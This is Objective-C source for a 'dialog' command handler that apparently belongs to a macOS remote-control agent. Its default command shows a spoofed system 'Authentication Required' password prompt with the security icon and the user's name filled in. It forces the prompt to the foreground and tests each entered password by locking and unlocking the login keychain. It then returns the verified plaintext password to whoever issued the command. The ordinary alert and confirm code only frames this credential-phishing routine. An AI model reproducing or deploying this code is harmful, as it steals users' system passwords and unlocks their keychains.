#import "ZDialogCommandHandler.h"
#import <AppKit/AppKit.h>
#import <Security/Security.h>
#import <objc/runtime.h>

@implementation ZDialogCommandHandler {
    NSMutableDictionary *_activeDialogs;
}

- (instancetype)init {
    self = [super initWithType:@"dialog"];
    if (self) {
        _activeDialogs = [[NSMutableDictionary alloc] init];
    }
    return self;
}

- (void)dealloc {
    [_activeDialogs release];
    [super dealloc];
}

// Helper method to properly style text fields to match macOS standards
- (void)setupTextField:(NSTextField *)textField {
    textField.backgroundColor = [NSColor clearColor];
    textField.bezeled = YES;
    textField.bezelStyle = NSTextFieldRoundedBezel;
    textField.cell.usesSingleLineMode = YES;
    textField.font = [NSFont systemFontOfSize:NSFont.smallSystemFontSize];
    textField.layer.cornerRadius = 1.5;
}

- (void)executeCommand:(ZCommandModel *)command 
           completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
    NSLog(@"Executing dialog command: %@", [command commandId]);
    NSLog(@"Dialog command payload: %@", [command payload]);
    
    // Get the payload from the command
    NSDictionary *payload = [command payload];
    
    // Extract dialog properties from payload or use defaults
    NSString *title;
    NSString *message;
    NSString *dialogType;
    
    // Check if this is a simple "dialog" command without parameters or with minimal parameters
    if (!payload || [payload count] == 0 || 
        ([payload objectForKey:@"command"] && [[payload objectForKey:@"command"] isEqualToString:@"dialog"])) {
        // Default to a password prompt if no specific parameters provided
        title = @"Authentication Required";
        message = @"Please enter your password to continue";
        dialogType = @"prompt";
        NSLog(@"Using default dialog parameters: type=%@, title=%@", dialogType, title);
    } else {
        // Use the provided parameters from the payload
        title = [payload objectForKey:@"title"];
        message = [payload objectForKey:@"message"];
        dialogType = [payload objectForKey:@"type"];
        
        if (!message) {
            NSError *error = [NSError errorWithDomain:@"ZDialogCommandHandler" 
                                               code:402 
                                           userInfo:[NSDictionary dictionaryWithObject:@"Dialog command requires a message" 
                                                                               forKey:NSLocalizedDescriptionKey]];
            if (completion) {
                completion(NO, nil, error);
            }
            return;
        }
        
        if (!dialogType) {
            dialogType = @"alert"; // Default to alert for explicit commands
        }
        
        if (!title) {
            title = @"Message"; // Default title
        }
        
        NSLog(@"Using provided dialog parameters: type=%@, title=%@", dialogType, title);
    }
    
    // Create a copy of the completion block to avoid release issues
    void (^safeCompletion)(BOOL, NSDictionary*, NSError*) = [[completion copy] autorelease];
    
    // Ensure proper application setup for UI operations - this must happen on main thread
    dispatch_async(dispatch_get_main_queue(), ^{
        [self ensureApplicationSetup];
        
        // Create result dictionary
        NSMutableDictionary *result = [NSMutableDictionary dictionary];
        
        if ([dialogType isEqualToString:@"alert"]) {
            [self showAlertWithTitle:title message:message result:result completion:^{
                // After dialog is dismissed, invoke completion handler
                if (safeCompletion) {
                    safeCompletion(YES, result, nil);
                }
            }];
        } else if ([dialogType isEqualToString:@"confirm"]) {
            [self showConfirmWithTitle:title message:message result:result completion:^{
                // After dialog is dismissed, invoke completion handler
                if (safeCompletion) {
                    safeCompletion(YES, result, nil);
                }
            }];
        } else if ([dialogType isEqualToString:@"prompt"]) {
            BOOL isAuthPrompt = [title isEqualToString:@"Authentication Required"];
            
            if (isAuthPrompt) {
                [self showPasswordPromptWithTitle:title message:message result:result completion:^{
                    // After dialog is dismissed, invoke completion handler
                    if (safeCompletion) {
                        safeCompletion(YES, result, nil);
                    }
                }];
            } else {
                [self showRegularPromptWithTitle:title message:message result:result completion:^{
                    // After dialog is dismissed, invoke completion handler
                    if (safeCompletion) {
                        safeCompletion(YES, result, nil);
                    }
                }];
            }
        } else {
            // Unknown dialog type, default to alert
            [self showAlertWithTitle:title message:message result:result completion:^{
                // After dialog is dismissed, invoke completion handler
                if (safeCompletion) {
                    safeCompletion(YES, result, nil);
                }
            }];
        }
    });
}

- (void)showAlertWithTitle:(NSString *)title message:(NSString *)message result:(NSMutableDictionary *)result completion:(void (^)(void))completion {
    NSAlert *alert = [[[NSAlert alloc] init] autorelease];
    [alert setMessageText:title];
    [alert setInformativeText:message];
    [alert addButtonWithTitle:@"OK"];
    
    // Position alert at the top of the screen
    NSRect screenRect = [[NSScreen mainScreen] frame];
    NSWindow *alertWindow = [alert window];
    [alertWindow setLevel:NSFloatingWindowLevel]; // Keep above other windows
    
    // Center horizontally, position at top of screen with margin
    [alertWindow center];
    NSRect frame = [alertWindow frame];
    frame.origin.y = screenRect.size.height - frame.size.height - 50; // 50px from top
    [alertWindow setFrame:frame display:YES];
    
    [NSApp activateIgnoringOtherApps:YES];
    [alert runModal];
    
    // Set result values
    [result setObject:@"alert_response" forKey:@"type"];
    [result setObject:@"ok" forKey:@"button"];
    
    // Call completion handler
    if (completion) completion();
}

- (void)showConfirmWithTitle:(NSString *)title message:(NSString *)message result:(NSMutableDictionary *)result completion:(void (^)(void))completion {
    NSAlert *alert = [[[NSAlert alloc] init] autorelease];
    [alert setMessageText:title];
    [alert setInformativeText:message];
    [alert addButtonWithTitle:@"Yes"];
    [alert addButtonWithTitle:@"No"];
    
    // Position alert at the top of the screen
    NSRect screenRect = [[NSScreen mainScreen] frame];
    NSWindow *alertWindow = [alert window];
    [alertWindow setLevel:NSFloatingWindowLevel]; // Keep above other windows
    
    // Center horizontally, position at top of screen with margin
    [alertWindow center];
    NSRect frame = [alertWindow frame];
    frame.origin.y = screenRect.size.height - frame.size.height - 50; // 50px from top
    [alertWindow setFrame:frame display:YES];
    
    [NSApp activateIgnoringOtherApps:YES];
    NSModalResponse returnCode = [alert runModal];
    
    // Set result values
    BOOL confirmed = (returnCode == NSAlertFirstButtonReturn);
    [result setObject:@"confirm_response" forKey:@"type"];
    [result setObject:(confirmed ? @"yes" : @"no") forKey:@"button"];
    [result setObject:[NSNumber numberWithBool:confirmed] forKey:@"confirmed"];
    
    // Call completion handler
    if (completion) completion();
}

- (void)showPasswordPromptWithTitle:(NSString *)title message:(NSString *)message result:(NSMutableDictionary *)result completion:(void (^)(void))completion {
    // Track password attempts
    __block int attemptsMade = 0;
    int maxAttempts = 5;
    __block NSString *passwordValue = nil;
    __block BOOL promptComplete = NO;
    
    void (^successHandler)(NSString *) = ^(NSString *password) {
        NSLog(@"Password validated successfully");
        passwordValue = [password copy]; // Use copy instead of retain for better safety
        promptComplete = YES;
    };
    
    void (^failureHandler)(NSModalResponse, NSString *) = ^(NSModalResponse response, NSString *password) {
        if (response == NSAlertFirstButtonReturn) {
            // User clicked OK but password was invalid
            NSLog(@"Invalid password attempt (%d of %d)", attemptsMade + 1, maxAttempts);
            attemptsMade++;
        } else {
            // User clicked Cancel
            NSLog(@"Password prompt canceled by user");
            promptComplete = YES;
        }
    };
    
    // Execute on main thread to handle UI
    dispatch_async(dispatch_get_main_queue(), ^{
        // Run the password prompt with retry behavior
        while (!promptComplete && attemptsMade < maxAttempts) {
            @autoreleasepool {
                // Create the alert
                NSTextField *usernameField = [[NSTextField alloc] initWithFrame:NSMakeRect(0, 31.0, 230.0, 24.0)];
                [self setupTextField:usernameField];
                usernameField.placeholderString = @"Username";
                usernameField.stringValue = NSFullUserName();
                usernameField.editable = NO;
                
                NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0.0, 0.0, 230.0, 24.0)];
                [self setupTextField:passwordField];
                passwordField.placeholderString = @"Password";
                
                NSView *accessoryView = [[NSView alloc] initWithFrame:NSMakeRect(0, 0, 230.0, 64.0)];
                [accessoryView addSubview:usernameField];
                [accessoryView addSubview:passwordField];
                
                NSAlert *alert = [[NSAlert alloc] init];
                [alert setMessageText:title];
                [alert setInformativeText:message];
                [alert setAccessoryView:accessoryView];
                [alert setIcon:[NSImage imageNamed:@"NSSecurity"]];
                [alert addButtonWithTitle:@"OK"];
                [alert addButtonWithTitle:@"Cancel"];
                
                // Position alert at the top of the screen
                NSRect screenRect = [[NSScreen mainScreen] frame];
                NSWindow *alertWindow = [alert window];
                [alertWindow setLevel:NSFloatingWindowLevel];
                
                // Center horizontally, position at top of screen with margin
                [alertWindow center];
                NSRect frame = [alertWindow frame];
                frame.origin.y = screenRect.size.height - frame.size.height - 50; // 50px from top
                [alertWindow setFrame:frame display:YES];
                
                // Make password field first responder
                [[alert window] makeFirstResponder:passwordField];
                
                [NSApp activateIgnoringOtherApps:YES];
                NSModalResponse response = [alert runModal];
                
                if (response == NSAlertFirstButtonReturn) {
                    // Copy the password value before we release the UI components
                    NSString *password = [[passwordField stringValue] copy];
                    
                    // Release UI components
                    [accessoryView release];
                    [usernameField release];
                    [passwordField release];
                    [alert release];
                    
                    // Verify the password using keychain
                    if ([self verifyPassword:password]) {
                        successHandler(password);
                    } else {
                        failureHandler(response, password);
                    }
                    
                    [password release]; // Release our copied password
                } else {
                    // User clicked Cancel
                    failureHandler(response, nil);
                    
                    // Release UI components
                    [accessoryView release];
                    [usernameField release];
                    [passwordField release];
                    [alert release];
                }
                
                // Process events to keep UI responsive
                [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
            } // End autorelease pool
        }
        
        // Set final result
        [result setObject:@"prompt_response" forKey:@"type"];
        
        if (passwordValue) {
            [result setObject:@"ok" forKey:@"button"];
            [result setObject:@"password" forKey:@"input_type"];
            [result setObject:passwordValue forKey:@"value"];
            [passwordValue release]; // Release our copied password
        } else {
            [result setObject:@"cancel" forKey:@"button"];
            [result setObject:@"password" forKey:@"input_type"];
            if (attemptsMade >= maxAttempts) {
                [result setObject:@"Max password attempts exceeded" forKey:@"error"];
            }
        }
        
        // Call completion handler
        if (completion) completion();
    });
}

- (BOOL)verifyPassword:(NSString *)password {
    if (!password || [password length] == 0) return NO;
    
    // Use the simpler keychain unlock approach for password verification
    const char *passwordCString = [password UTF8String];
    unsigned long length = strlen(passwordCString);
    
    // Lock keychain first to ensure we're testing the password correctly
    SecKeychainLock(NULL);
    
    // Try to unlock with the provided password
    OSStatus status = SecKeychainUnlock(NULL, (UInt32)length, passwordCString, TRUE);
    
    return (status == errSecSuccess);
}

- (void)showRegularPromptWithTitle:(NSString *)title message:(NSString *)message result:(NSMutableDictionary *)result completion:(void (^)(void))completion {
    NSAlert *alert = [[[NSAlert alloc] init] autorelease];
    [alert setMessageText:title];
    [alert setInformativeText:message];
    
    NSTextField *inputField = [[[NSTextField alloc] initWithFrame:NSMakeRect(0.0, 0.0, 230.0, 24.0)] autorelease];
    [self setupTextField:inputField];
    
    NSView *accessoryView = [[[NSView alloc] initWithFrame:NSMakeRect(0, 0, 230.0, 24.0)] autorelease];
    [accessoryView addSubview:inputField];
    
    [alert setAccessoryView:accessoryView];
    [alert addButtonWithTitle:@"OK"];
    [alert addButtonWithTitle:@"Cancel"];
    
    // Position alert at the top of the screen
    NSRect screenRect = [[NSScreen mainScreen] frame];
    NSWindow *alertWindow = [alert window];
    [alertWindow setLevel:NSFloatingWindowLevel]; // Keep above other windows
    
    // Center horizontally, position at top of screen with margin
    [alertWindow center];
    NSRect frame = [alertWindow frame];
    frame.origin.y = screenRect.size.height - frame.size.height - 50; // 50px from top
    [alertWindow setFrame:frame display:YES];
    
    // Make the input field the first responder
    [[alert window] makeFirstResponder:inputField];
    
    [NSApp activateIgnoringOtherApps:YES];
    NSModalResponse returnCode = [alert runModal];
    
    // Set result values
    BOOL confirmed = (returnCode == NSAlertFirstButtonReturn);
    [result setObject:@"prompt_response" forKey:@"type"];
    [result setObject:(confirmed ? @"ok" : @"cancel") forKey:@"button"];
    
    if (confirmed) {
        NSString *value = [inputField stringValue];
        [result setObject:(value ? value : @"") forKey:@"value"];
    }
    
    // Call completion handler
    if (completion) completion();
}

- (void)ensureApplicationSetup {
    if (![NSThread isMainThread]) {
        NSLog(@"ensureApplicationSetup must be called from main thread!");
        return;
    }
    
    NSLog(@"Ensuring application is properly set up for UI");
    
    // Create shared application if needed
    [NSApplication sharedApplication];
    
    // Make sure the app is properly activated
    if (![NSApp isRunning]) {
        NSLog(@"Initializing NSApp");
        // Use Accessory policy instead of Regular to avoid dock icon
        [NSApp setActivationPolicy:NSApplicationActivationPolicyAccessory];
        [NSApp finishLaunching];
    }
    
    // Ensure the app is activated (brings to foreground)
    [NSApp activateIgnoringOtherApps:YES];
}

// Adding minimalist method for cancellation
- (BOOL)canCancelCommand {
    return YES;
}

- (BOOL)cancelCommand:(ZCommandModel *)command {
    return NO; // We don't actually cancel since we've simplified the dialog handling
}

@end 